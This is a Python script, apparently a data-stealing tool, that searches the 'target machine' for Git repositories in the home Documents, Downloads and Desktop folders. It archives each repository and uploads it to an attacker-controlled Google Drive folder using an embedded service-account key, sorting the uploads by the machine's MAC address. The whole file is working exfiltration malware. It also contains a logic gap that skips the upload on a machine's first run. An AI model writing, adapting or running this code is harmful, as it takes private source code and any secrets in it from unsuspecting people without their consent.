from datetime import date
import re
import subprocess
import scapy.all as scapy
from scapy.layers import http
from sys import platform
import os
import tarfile
from apiclient.discovery import build
from oauth2client.service_account import ServiceAccountCredentials
from httplib2 import Http
from googleapiclient.http import MediaFileUpload
import uuid

cwd=os.getcwd()
scopes = ['https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name('finalkey.json', scopes)
driveService = build('drive', 'v3', credentials=creds)
parentDir='1cfjlBcYJPEdcHBoc3aa94zPvnUfJTCSm'
UUID=hex(uuid.getnode())
mime_types={'folder':'application/vnd.google-apps.folder','text':'text/plain'}
today=date.today()
date_folder_name=today.strftime("%d_%m_%Y")

def tardir(repository, dest_folder):
    print(dest_folder)
    with tarfile.open(dest_folder, mode='w:gz') as archive:
        archive.add(repository, recursive=True)
    return

def searchFile(fileName,mimeType,parentID):
    page_token=None
    while True:
        query="mimeType= '{}' and name contains '{}' and '{}' in parents".format(mimeType,fileName,parentID)
        #print(query)
        response = driveService.files().list(q=query,
                                            spaces='drive',
                                            fields='nextPageToken, files(id, name)',
                                            pageToken=page_token).execute()

        if len(response.get('files', [])) != 0:
            file=response.get('files', [])[0]
            print("File is present! Name={} : ID={}".format(file.get('name'),file.get('id')))
            return file.get('id')

        page_token = response.get('nextPageToken', None)

        #print("Page token=",page_token)
        if page_token is None:
            break

    return None

def createfile(fileName,mimeType,parent_id):
    file_metadata = {
                    'name' : fileName,
                    'parents' : [parent_id],
                    'mimeType' : mimeType
                    }
    file = driveService.files().create(body=file_metadata,fields='id').execute()
    print("Created Folder=",file.get('id'))
    return file.get('id')


def uploadFile(fileName,mimeType,parent_id):

    metadata = {
        'name': fileName, 
        "parents": [parent_id]
        }
    #Now create the media file upload object and tell it what file to upload,
    #in this case 'test.html'
    media = MediaFileUpload(fileName, mimetype = mimeType)
    #Now we're doing the actual post, creating a new file of the uploaded type
    file = driveService.files().create(body=metadata, media_body=media,fields='id').execute()
    #Because verbosity is nice
    print("Created file '%s' id '%s'." % (file.get('name'), file.get('id')))
    return

def uploadToDrive(fileName,mimeType):
    print("Searching for uuid folder!") 
    uuid_folder_id=searchFile(UUID,mime_types['folder'],parentDir)
    if uuid_folder_id==None:
        folderID=createfile(UUID,mime_types['folder'],parentDir)
        print("Created UUID Folder ID=",folderID)
        date_folder_id=createfile(date_folder_name,mime_types['folder'],folderID)
        print("Created Date Folder ID=",date_folder_id)
    else:
        date_folder_id=searchFile(date_folder_name,mime_types['folder'],uuid_folder_id)
        if date_folder_id==None:
            date_folder_id=createfile(date_folder_name,mime_types['folder'],uuid_folder_id)
            print("Created Date Folder ID=",date_folder_id)
            print("Uploading file to date folder!")
            uploadFile(fileName,mimeType,date_folder_id)
        else:
            print("Uploading file to date folder!")
            uploadFile(fileName,mimeType,date_folder_id)
        
    return

def get_git_repos():
    #Find all Git repositories in the target machine
    try:
        command="mkdir gitFiles ; cd ; find ./Documents ./Downloads ./Desktop -type d -exec test -e '{}/.git' \; -print -prune"
    except:
        exit()
    #find . -type d -exec test -e '{}/.git' ';' -print -prune
    ret = subprocess.run(command, capture_output=True, shell=True)
    repositories=ret.stdout.decode().strip()
    print(repositories)
    
    for repository in repositories.split('\n'):
        print("Obtaining the repository {}".format(repository))               
        path,folder=re.findall(r'(.*)\/(.*)$',repository)[0]
        #print("Path,folder=",path," ",folder)
        #command2='tar -zcf gitFiles/{}.tar.gz ~"{}" 2>/dev/null'.format(folder,repository[1:]) 
        dest_folder=cwd+"/gitFiles/"+folder+'.tar.gz'
        try:   
            tardir(repository,dest_folder)
            print("Tarred the file! Uploading to Drive!")
            uploadToDrive(dest_folder,'application/tar')    
            print("Uploading done!")
        except:
            continue
    return 

if __name__ == '__main__':
    os.chdir('/')
    print(os.path.expanduser("~"))
    os.chdir(os.path.expanduser("~"))
    #interfaces = scapy.get_if_list()
    print("Changed version!")
    print(platform)
    get_git_repos()